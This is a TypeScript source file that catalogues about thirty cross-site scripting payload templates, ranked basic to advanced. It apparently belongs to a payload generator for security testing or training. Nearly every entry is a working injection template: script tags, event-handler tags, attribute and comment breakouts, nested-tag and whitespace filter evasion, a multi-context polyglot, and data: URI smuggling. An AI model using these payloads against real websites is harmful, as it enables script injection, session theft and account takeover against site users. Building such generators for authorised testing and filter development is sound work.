import { utf8Bytes } from "../hash/bytes";

export type XssLevel = "basic" | "intermediate" | "advanced";
export type XssContext = "reflected-stored" | "dom";
/** Which syntactic position the action expression lands in — governs which obfuscation
 *  techniques (lib/xss/obfuscation.ts) are even valid to combine with a given injection type.
 *  "attribute": inside an HTML attribute value (onerror=, onload=, href=...).
 *  "script": raw JS inside a <script> element or an already-JS execution context.
 *  "uri": raw JS following a javascript: URI prefix (same rules as "script" for obfuscation
 *  purposes, kept distinct because it never sits inside HTML attribute delimiters). */
export type XssSlot = "attribute" | "script" | "uri";
export type XssQuote = '"' | "'";

export type XssInjectionType = {
  id: string;
  label: string;
  level: XssLevel;
  contexts: XssContext[];
  slot: XssSlot;
  technique: string;
  /** Builds the HTML/URI fragment around the (possibly obfuscated) action expression.
   *  `quote` picks which quote character delimits attribute values / JS string literals this
   *  injection type introduces, so callers can dodge a blacklisted quote character. Injection
   *  types that don't use quotes at all (URI/script-only ones) simply ignore the parameter. */
  render: (actionExpr: string, quote: XssQuote) => string;
};

const BOTH: XssContext[] = ["reflected-stored", "dom"];

function percentEncode(input: string): string {
  return Array.from(utf8Bytes(input), (b) => "%" + b.toString(16).toUpperCase().padStart(2, "0")).join("");
}

export const XSS_INJECTION_TYPES: XssInjectionType[] = [
  // ---- basic ----
  {
    id: "basic-script-tag",
    label: "<script> tag",
    level: "basic",
    contexts: BOTH,
    slot: "script",
    technique: "Plain <script> tag",
    render: (a) => `<script>${a}</script>`,
  },
  {
    id: "basic-attr-breakout",
    label: "Attribute breakout",
    level: "basic",
    contexts: ["reflected-stored"],
    slot: "script",
    technique: "Quote-and-tag breakout of the current attribute, followed by a new <script> tag",
    render: (a, q) => `${q}><script>${a}</script>`,
  },
  {
    id: "basic-img-onerror",
    label: "<img onerror>",
    level: "basic",
    contexts: BOTH,
    slot: "attribute",
    technique: "<img onerror> event handler (fires when the bogus src fails to load)",
    render: (a, q) => `<img src=x onerror=${q}${a}${q}>`,
  },
  {
    id: "basic-svg-onload",
    label: "<svg onload>",
    level: "basic",
    contexts: BOTH,
    slot: "attribute",
    technique: "<svg onload> event handler",
    render: (a, q) => `<svg onload=${q}${a}${q}>`,
  },
  {
    id: "basic-body-onload",
    label: "<body onload>",
    level: "basic",
    contexts: ["reflected-stored"],
    slot: "attribute",
    technique: "<body onload> event handler",
    render: (a, q) => `<body onload=${q}${a}${q}>`,
  },
  {
    id: "basic-javascript-uri",
    label: "javascript: URI",
    level: "basic",
    contexts: ["dom"],
    slot: "uri",
    technique: "javascript: URI fed into an href/src sink",
    render: (a) => `javascript:${a}`,
  },
  {
    id: "basic-hash-onload",
    label: "URL fragment -> <img onerror>",
    level: "basic",
    contexts: ["dom"],
    slot: "attribute",
    technique: "URL fragment reflected into an onerror sink",
    render: (a, q) => `#<img src=x onerror=${q}${a}${q}>`,
  },
  {
    id: "basic-attr-breakout-javascript-uri",
    label: "Attribute breakout -> javascript: URI",
    level: "basic",
    contexts: ["reflected-stored"],
    slot: "attribute",
    technique: "Closes the current attribute and rewrites it as an href pointing to a javascript: URI — needs neither < nor > nor a new tag",
    render: (a, q) => `${q} href=${q}javascript:${a}`,
  },

  // ---- intermediate ----
  {
    id: "intermediate-case-variation",
    label: "Mixed-case <ScRiPt>",
    level: "intermediate",
    contexts: ["reflected-stored"],
    slot: "script",
    technique: "Mixed-case tag/attribute to dodge case-sensitive filters",
    render: (a) => `<ScRiPt>${a}</sCrIpT>`,
  },
  {
    id: "intermediate-slash-no-space",
    label: "Slash instead of space",
    level: "intermediate",
    contexts: BOTH,
    slot: "attribute",
    technique: "Slash instead of whitespace before the event handler",
    render: (a, q) => `<svg/onload=${q}${a}${q}>`,
  },
  {
    id: "intermediate-iframe-srcdoc",
    label: "<iframe srcdoc>",
    level: "intermediate",
    contexts: ["reflected-stored"],
    slot: "script",
    technique: "Alternative tag: <iframe srcdoc> with an HTML-entity-encoded nested <script>",
    render: (a, q) => `<iframe srcdoc=${q}&lt;script&gt;${a}&lt;/script&gt;${q}></iframe>`,
  },
  {
    id: "intermediate-details-ontoggle",
    label: "<details ontoggle>",
    level: "intermediate",
    contexts: BOTH,
    slot: "attribute",
    technique: "Alternative tag: <details ontoggle>, fires automatically when open",
    render: (a, q) => `<details open ontoggle=${q}${a}${q}>`,
  },
  {
    id: "intermediate-input-autofocus",
    label: "<input autofocus onfocus>",
    level: "intermediate",
    contexts: BOTH,
    slot: "attribute",
    technique: "Alternative tag: <input autofocus onfocus>",
    render: (a, q) => `<input autofocus onfocus=${q}${a}${q}>`,
  },
  {
    id: "intermediate-video-onerror",
    label: "<video onerror>",
    level: "intermediate",
    contexts: BOTH,
    slot: "attribute",
    technique: "Alternative tag: <video src=x onerror>",
    render: (a, q) => `<video src=x onerror=${q}${a}${q}>`,
  },
  {
    id: "intermediate-select-autofocus",
    label: "<select autofocus onfocus>",
    level: "intermediate",
    contexts: BOTH,
    slot: "attribute",
    technique: "Alternative tag: <select autofocus onfocus>",
    render: (a, q) => `<select autofocus onfocus=${q}${a}${q}>`,
  },
  {
    id: "intermediate-textarea-autofocus",
    label: "<textarea autofocus onfocus>",
    level: "intermediate",
    contexts: BOTH,
    slot: "attribute",
    technique: "Alternative tag: <textarea autofocus onfocus>",
    render: (a, q) => `<textarea autofocus onfocus=${q}${a}${q}>`,
  },
  {
    id: "intermediate-marquee-onstart",
    label: "<marquee onstart>",
    level: "intermediate",
    contexts: BOTH,
    slot: "attribute",
    technique: "Alternative tag: <marquee onstart>, fires automatically on render",
    render: (a, q) => `<marquee onstart=${q}${a}${q}>`,
  },
  {
    id: "intermediate-attr-breakout-no-tag",
    label: "Existing-attribute breakout (no new tag)",
    level: "intermediate",
    contexts: ["reflected-stored"],
    slot: "attribute",
    technique: "Closes the current attribute and adds a new event handler without introducing < or > — bypasses angle-bracket filtering",
    render: (a, q) => `${q} autofocus onfocus=${q}${a}${q}`,
  },
  {
    id: "intermediate-nested-tag-split",
    label: "Nested tag split",
    level: "intermediate",
    contexts: ["reflected-stored"],
    slot: "script",
    technique: "Nested tag to survive naive tag-stripping filters",
    render: (a) => `<scr<script>ipt>${a}</scr</script>ipt>`,
  },
  {
    id: "intermediate-hash-eval",
    label: "URL fragment -> eval(location.hash)",
    level: "intermediate",
    contexts: ["dom"],
    slot: "script",
    technique: "URL fragment for sinks that eval(location.hash) directly — no HTML needed",
    render: (a) => `#${a}`,
  },

  // ---- advanced ----
  {
    id: "advanced-whitespace-bypass",
    label: "Tab/newline inside tag",
    level: "advanced",
    contexts: ["reflected-stored"],
    slot: "attribute",
    technique: "Tab/newline inside the tag to dodge naive regex filters",
    render: (a, q) => `<img\tsrc=x\nonerror=${q}${a}${q}>`,
  },
  {
    id: "advanced-dom-fragment-encoded",
    label: "Percent-encoded fragment",
    level: "advanced",
    contexts: ["dom"],
    slot: "attribute",
    technique: "Percent-encoded fragment payload for a DOM sink reading location.hash",
    render: (a, q) => `#${percentEncode(`<img src=x onerror=${q}${a}${q}>`)}`,
  },
  {
    id: "advanced-polyglot",
    label: "Multi-context polyglot",
    level: "advanced",
    contexts: ["reflected-stored"],
    slot: "attribute",
    technique: "Fires across several injection contexts (attribute, tag, event handler) at once, useful when the exact context is unknown",
    render: (a, q) =>
      `${q}><svg/onload=${a}>//</style></script></textarea></title><svg/onload=${a}>`,
  },
  {
    id: "advanced-comment-breakout",
    label: "HTML comment breakout",
    level: "advanced",
    contexts: ["reflected-stored"],
    slot: "script",
    technique: "Escapes an HTML comment the input is reflected into (e.g. <!-- INPUT -->)",
    render: (a) => `--><script>${a}</script><!--`,
  },
  {
    id: "advanced-js-string-breakout",
    label: "Inline JS string breakout",
    level: "advanced",
    contexts: ["reflected-stored"],
    slot: "script",
    technique: "Breaks out of a quoted inline JS string literal (e.g. var x='INPUT';)",
    render: (a, q) => `${q};${a};//`,
  },
  {
    id: "advanced-template-literal-breakout",
    label: "Template literal breakout",
    level: "advanced",
    contexts: ["dom"],
    slot: "script",
    technique: "Breaks into a template-literal interpolation slot (${...}) for sinks that build JS template strings from untrusted input",
    render: (a) => "${" + a + "}",
  },
  {
    id: "advanced-object-data-uri",
    label: "<object data> data: URI",
    level: "advanced",
    contexts: ["reflected-stored"],
    slot: "attribute",
    technique: "data: URI nested inside <object data> to smuggle a full HTML/script document",
    render: (a, q) => `<object data=${q}data:text/html,${percentEncode(`<script>${a}</script>`)}${q}>`,
  },
  {
    id: "advanced-svg-animate-onbegin",
    label: "<svg><animate onbegin>",
    level: "advanced",
    contexts: BOTH,
    slot: "attribute",
    technique: "SVG <animate onbegin> — fires without user interaction, bypasses onload/onerror-specific filters",
    render: (a, q) => `<svg><animate onbegin=${q}${a}${q} attributeName=x dur=1s></svg>`,
  },
  {
    id: "advanced-meta-refresh-js",
    label: "<meta refresh> javascript: URI",
    level: "advanced",
    contexts: ["reflected-stored"],
    slot: "attribute",
    technique: "meta-refresh redirect to a javascript: URI — blocked by modern browsers but still seen in legacy WAF test suites",
    render: (a, q) => `<meta http-equiv=refresh content=${q}0;url=javascript:${a}${q}>`,
  },
];
